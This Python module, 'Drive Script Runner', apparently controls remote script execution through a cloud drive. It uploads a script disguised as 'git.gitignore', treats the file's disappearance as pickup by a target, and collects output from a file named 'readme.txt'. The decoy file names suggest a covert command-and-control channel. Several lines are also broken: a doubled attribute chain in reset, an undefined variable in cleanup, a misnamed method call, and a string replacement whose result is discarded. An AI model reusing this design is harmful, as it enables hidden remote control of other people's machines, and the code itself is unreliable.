"""
Drive Script Runner
"""


from enum import Enum
from abc import ABC, abstractmethod
from drive.drive_watcher import DriveListener


class DSState(Enum):
    Initial = 1
    Sending = 2
    Sent = 3
    Running = 4
    Finished = 5


class DSStateListener(ABC):
    @abstractmethod
    def changed(self, state):
        pass


# Drive change listener
class DSListener(DriveListener):
    def __init__(self, master):
        self._master = master

    def changed(self):
        self._master._drive_changed()


class DSRunner:
    ScriptFileName = "git.gitignore"
    ScriptOutputFileName = "readme.txt"

    def __init__(self, drive_client, path_prefix, state_listener=None):
        self._drive_client = drive_client
        self._path_prefix = path_prefix
        self._drive_listener = DSListener(self)
        self._script_state = DSState.Initial
        self._script_state_listener = state_listener
        self._script_output = ""

        # Listen drive changes
        drive_client.get_watcher().register(self._drive_listener)

    def run_script(self, script):
        if self._script_state == DSState.Initial or self._script_state == DSState.Finished:
            if self._script_state == DSState.Finished:
                self._change_state(DSState.Initial)
            # Send script to target
            script = self._replace_script_tags(script)
            self._change_state(DSState.Sending)
            self._drive_client.upload_file_content(script, self._get_script_file_path())

    def reset(self):
        self._drive_client.self._drive_client.remove(self._get_script_file_path())
        self._drive_client.self._drive_client.remove(self.get_script_output_file_path())
        self._script_state = DSState.Initial
        self._script_output = ""

    def cleanup(self):
        self.reset()
        drive_client.get_watcher().unregister(self._drive_listener)


    def get_script_state(self):
        return self._script_state

    def get_script_output(self):
        # Get dir contents
        file_list = self._drive_client.list_dir(self._path_prefix)
        if self.ScriptOutputFileName in file_list:
            # Take output from drive
            output_file_path = self._get_script_output_file_path()
            self._script_output = self._drive_client.download_file_content(output_file_path)
            self._drive_client.remove(output_file_path)
        return self._script_output

    def _drive_changed(self):
        # Get dir contents
        file_list = self._drive_client.list_dir(self._path_prefix)
        exists_script_file = self.ScriptFileName in file_list
        exists_script_output_file = self.ScriptOutputFileName in file_list
        # Resolve state
        if self._script_state == DSState.Sending:
            if exists_script_file:
                self._change_state(DSState.Sent)
        elif self._script_state == DSState.Sent:
            if not exists_script_file:
                self._change_state(DSState.Running)
        elif self._script_state == DSState.Running:
            if exists_script_output_file:
                self._change_state(DSState.Finished)

    def _change_state(self, state):
        self._script_state = state
        if self._script_state_listener:
            self._script_state_listener.changed(state)

    def _get_script_file_path(self):
        return self._path_prefix + "/" + self.ScriptFileName

    def _get_script_output_file_path(self):
        return self._path_prefix + "/" + self.ScriptOutputFileName

    def _replace_script_tags(self, script):
        script.replace("<path_prefix>", self._path_prefix)
        return script
